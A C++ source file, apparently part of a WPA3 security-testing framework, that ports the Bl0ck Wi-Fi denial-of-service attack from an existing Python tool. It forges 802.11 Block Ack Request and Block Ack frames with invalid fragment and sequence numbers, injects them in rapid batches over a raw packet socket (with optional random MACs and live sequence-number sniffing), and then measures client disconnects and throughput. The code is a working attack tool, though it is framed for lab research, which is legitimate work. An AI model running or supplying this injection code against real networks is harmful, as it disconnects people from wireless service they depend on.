#include "attacks/DoS_soft/bl0ck/bl0ck.h"

#include <cassert>
#include <cerrno>
#include <chrono>
#include <condition_variable>
#include <fstream>
#include <linux/if_packet.h>
#include <memory>
#include <net/if.h>
#include <nlohmann/json.hpp>
#include <random>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <thread>
#include <unistd.h>

#include "attacks/components/setup_connections.h"
#include "attacks/components/sniffer_helper.h"
#include "config/RunStatus.h"
#include "default.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "ex_program/hostapd/hostapd_helper.h"
#include "logger/error_log.h"
#include "logger/log_util.h"
#include "observer/iperf_wrapper.h"
#include "observer/observers.h"
#include "observer/trace_cmd_wrapper.h"
#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"
#include "visual/result_helper.h"

#include <linux/if_ether.h>

// rewrite from python
// https://github.com/efchatz/Bl0ck/tree/main?tab=readme-ov-file
namespace wpa3_tester::bl0ck_attack {
using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;
using json = nlohmann::json;

RadioTap get_BAR_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const uint8_t fn, const uint16_t sn) {
	//for some reason is dst first
	Dot11BlockAckRequest bar(ap_mac, sta_mac); //  STA(attacker) -> AP
	bar.fragment_number(fn);
	bar.start_sequence(sn);

	const vector<uint8_t> payload_data = {
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
	};
	RadioTap rt{}; //FIXME valid with all adapters? fill with driver?
	rt.tx_flags(0x28); // NOSEQ|ORDER
	return rt / bar / RawPDU(payload_data);
}

RadioTap get_BA_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
	Dot11BlockAck ba(ap_mac, sta_mac); // STA(attacker) -> AP
	ba.fragment_number(4);			   // invalid FN
	ba.start_sequence(1175);		   // random invalid SSN
	ba.bar_control(0x0004);
	const vector<uint8_t> payload_data = {
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
	};
	RadioTap rt{}; //TODO at leas noORDER
	rt.tx_flags(0x28); // NOSEQ|ORDER
	return rt / ba / RawPDU(payload_data);
}

struct BARSContext {
	atomic<uint16_t> current_sn{ 0 };
	atomic<uint8_t> current_fn{ 0 };
	atomic<bool> has_sn{ false };
	atomic<bool> stop{ false };
};

static void bars_sniffer_thread(
		const HWAddress<6> &sta_mac, const string &iface, BARSContext &ctx, const int timeout_sec) {
	const string filter = "wlan type data subtype qos-data and wlan addr2 " + sta_mac.to_string();

	components::poll_sniffer_pdu<monostate>(
			[&](PDU &pdu) -> optional<monostate> {
				if(ctx.stop.load()) return monostate{};

				const auto *qos = pdu.find_pdu<Dot11QoSData>();
				if(!qos) return nullopt;

				const uint16_t sn = (qos->seq_num() + 16) % 4096;
				const uint8_t fn = qos->frag_num();
				ctx.current_sn.store(sn);
				ctx.current_fn.store(fn);
				ctx.has_sn.store(true);
				log(LogLevel::DEBUG, "BARS: Updated SSN={} FN={}", sn, fn);
				return nullopt; // continue
			},
			iface,
			filter,
			seconds(timeout_sec));
}

// Raw AF_PACKET socket with MSG_DONTWAIT: when the USB TX URB queue is full,
// sendto() returns EAGAIN immediately instead of blocking iface what use synchronous (mt76x2u)
// Frames are dropped but the timing loop runs as designed
RawSocket get_unblocking_socket(const string &iface) {
	const int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(fd < 0) throw runtime_error(string("bl0ck: socket: ") + strerror(errno));
	ifreq ifr{};
	strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFINDEX, &ifr);
	sockaddr_ll addr{};
	addr.sll_family = AF_PACKET;
	addr.sll_protocol = htons(ETH_P_ALL);
	addr.sll_ifindex = ifr.ifr_ifindex;
	bind(fd, reinterpret_cast<sockaddr *>(&addr), sizeof(addr));
	return { fd, addr };
}

void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_mac, const string &iface, const int frame_in_batch,
		const string &attack_type, const int duration_sec, const bool is_random, const int ms_interval) {
	assert(attack_type == "BAR" || attack_type == "BA" || attack_type == "BARS");

	log(LogLevel::INFO, "Starting bl0ck exploit - Type: {}", attack_type);

	auto [fd, addr] = get_unblocking_socket(iface);

	log(LogLevel::INFO, "Sending frames - Duration: {} sec, Concurrent frames: {}", duration_sec, frame_in_batch);

	BARSContext bars_ctx;

	// ReSharper disable once CppTooWideScope // if in BARS if, join after emplace
	optional<jthread> sniffer_thread;
	if(attack_type == "BARS") {
		sniffer_thread.emplace([&] { bars_sniffer_thread(sta_mac, iface, bars_ctx, duration_sec); });
	}

	int iteration = 0;
	const auto end_time = steady_clock::now() + seconds(duration_sec);
	while(steady_clock::now() < end_time) {
		const HWAddress<6> sta_hw = is_random ? hw_capabilities::rand_mac() : sta_mac;
		RadioTap frame;
		if(attack_type == "BAR") {
			frame = get_BAR_frame(ap_mac, sta_hw);
		}else if(attack_type == "BA") {
			frame = get_BA_frame(ap_mac, sta_hw);
		}else {
			frame = get_BAR_frame(ap_mac, sta_hw, bars_ctx.current_fn.load(), bars_ctx.current_sn.load());
		}

		const auto bytes = frame.serialize();
		log(LogLevel::DEBUG, "Sending batch {}", iteration);
		for(int i = 0; i < frame_in_batch; ++i)
			sendto(fd,
					bytes.data(),
					bytes.size(),
					MSG_DONTWAIT,
					reinterpret_cast<const sockaddr *>(&addr),
					sizeof(addr));
		this_thread::sleep_for(milliseconds(ms_interval));
		iteration++;
	}
	close(fd);
	log(LogLevel::INFO, "Block attack completed after {} iterations", iteration);
}

static Bl0ckResult compute_result(const RunStatus &rs) {
	Bl0ckResult r{};
	if(rs.get_actor("client")->is_WB()) {
		const auto window = visual::helper::get_run_window(rs, rs.get_actor("client"));
		const auto disc_times = get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED", window);
		r.disconnect_count = static_cast<int>(disc_times.size());
		const auto conn_times = get_time_logs(rs, "client", "CTRL-EVENT-CONNECTED", window);
		for(const auto &disc: disc_times) {
			for(const auto &conn: conn_times) {
				if(conn > disc) {
					r.reconnect_times_ms.push_back(
							static_cast<double>(duration_cast<milliseconds>(conn - disc).count()));
					break;
				}
			}
		}
	}
	if(rs.get_actor("ap")->is_WB()) {
		const auto window = visual::helper::get_run_window(rs, rs.get_actor("ap"));
		r.ap_disconnected = !get_time_logs(rs, "ap", "AP-STA-DISCONNECTED", window).empty();
	}

	if(r.disconnect_count > 0 || r.ap_disconnected) { log(LogLevel::INFO, "Client disconnected"); }
	return r;
}

static Bl0ckResult load_result(const RunStatus &rs) {
	const path p = rs.run_folder() / RESULT_NAME;
	ifstream f(p);
	if(!f.is_open()) {
		log(LogLevel::WARNING, "result.json not found, recomputing");
		return compute_result(rs);
	}
	const json j = json::parse(f);
	Bl0ckResult r{};
	r.disconnect_count = j.at("disconnect_count").get<int>();
	if(j.contains("ap_disconnected") && !j.at("ap_disconnected").is_null())
		r.ap_disconnected = j.at("ap_disconnected").get<bool>();
	r.reconnect_times_ms = j.value("reconnect_times_ms", vector<double>{});
	return r;
}

void setup_attack(RunStatus &rs) {
	components::client_ap_setup_t(rs);
	components::setup_rogue_ap(rs);
}

void run_bl0ck_attack(RunStatus &rs) {
	const auto &att_cfg = rs.config().at("attack_config");
	const auto &attacker = rs.get_actor("attacker");
	const string iface = attacker.get(SK::iface);

	const string STA_mac = rs.get_actor("client").get(SK::mac);
	const string AP_mac = rs.get_actor("ap").get(SK::mac);

	const string bl0ck_att_type = att_cfg.at("attack_variant").get<string>();
	const int duration = att_cfg.at("attack_time_sec").get<int>();
	const int frame_in_batch = att_cfg.at("frame_in_batch").get<int>();
	const bool is_random = att_cfg.at("random").get<bool>();
	const int ms_interval = att_cfg.at("ms_interval").get<int>();

	rs.start_observers();

	log(LogLevel::INFO, "Block Attack START (Type: {}, Frames: {})", bl0ck_att_type, frame_in_batch);
	this_thread::sleep_for(seconds(att_cfg.at("sleep_before_sec")));
	block(STA_mac, AP_mac, iface, frame_in_batch, bl0ck_att_type, duration, is_random, ms_interval);

	rs.process_manager.write_log_all("Block Attack END");
	this_thread::sleep_for(seconds(att_cfg.at("sleep_after_sec")));
	rs.process_manager.stop_all();

	auto [disconnect_count, ap_disconnected, reconnect_times_ms] = compute_result(rs);
	rs.save_result({ { "disconnect_count", disconnect_count },
			{ "ap_disconnected", ap_disconnected },
			{ "reconnect_times_ms", reconnect_times_ms } });
}

void stats_bl0ck_attack(const RunStatus &rs) {
	log(LogLevel::INFO, "Bl0ck attack stats");

	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
	if(rs.actor("rogue_ap")) {
		elements.push_back(make_unique<EventLines>(get_time_logs(rs, "rogue_ap", "Captured a WPA"), "MANA", "black"));
	}

	// BA/BAR are injected by attacker - mt76x2u does not loopback injected frames,
	// so they don't appear in attacker_capture.pcap. Use client sniff_iface instead.
	const string ba_src = rs.actor("client") && rs.get_actor("client")->is_WB() ? "client" : "attacker";
	observer::tshark::pcap_events(rs,
			elements,
			{
					// ----- protected with MFP (action frames)
					{ ba_src, "wlan.fixed.action_code == 0x00", "ADDBA req", "blue" },
					{ ba_src, "wlan.fixed.action_code == 0x01", "ADDBA res", "blue" },
					{ ba_src, "wlan.fixed.action_code == 0x02", "DELBA", "blue" },

					{ ba_src, "(wlan.fc.type_subtype == 0x0018) && (wlan.fixed.ssc.fragment == 4)", "BAR_fn4", "cyan" },
					{ ba_src,
							"(wlan.fc.type_subtype == 0x0019) && (wlan.fixed.ssc.fragment == 4)",
							"BA_fn4",
							"purple" },
			});

	if(auto ampdu = observer::trace_cmd::get_bl0ck_logs(rs, "ap"); !ampdu.empty())
		elements.push_back(make_unique<GraphStairs<observer::trace_cmd::AmpduAction>>(
				ampdu, observer::trace_cmd::ampdu_action_labels(), "AMPDU", "purple", YAxis::Y2));

	const path iperf_dir = observer::get_observer_folder(rs, "iperf3");
	if(auto xy = observer::iperf_log_to_xy(iperf_dir / "ap_iperf3_server.log", "AP-RX", "red"))
		elements.push_back(make_unique<GraphXYPoints>(std::move(*xy)));
	if(auto xy = observer::iperf_log_to_xy(iperf_dir / "client_iperf3_gen.log", "CL-TX", "blue"))
		elements.push_back(make_unique<GraphXYPoints>(std::move(*xy)));

	//const path attacker_graph = observer::tshark::tshark_graph(rs, "attacker", elements);
	const path client_graph = observer::tshark::tshark_graph(rs, "client", elements);
	/*const path ap_graph = observer::tshark::tshark_graph(rs, "ap", elements,
		observer::get_observer_folder(rs, "tcpdump"));*/

	const Bl0ckResult result = load_result(rs);
	generate_report(rs, result, /*attacker_graph,*/ client_graph /*, ap_graph*/);

	log(LogLevel::INFO, "Bl0ck attack stats done");
}
}
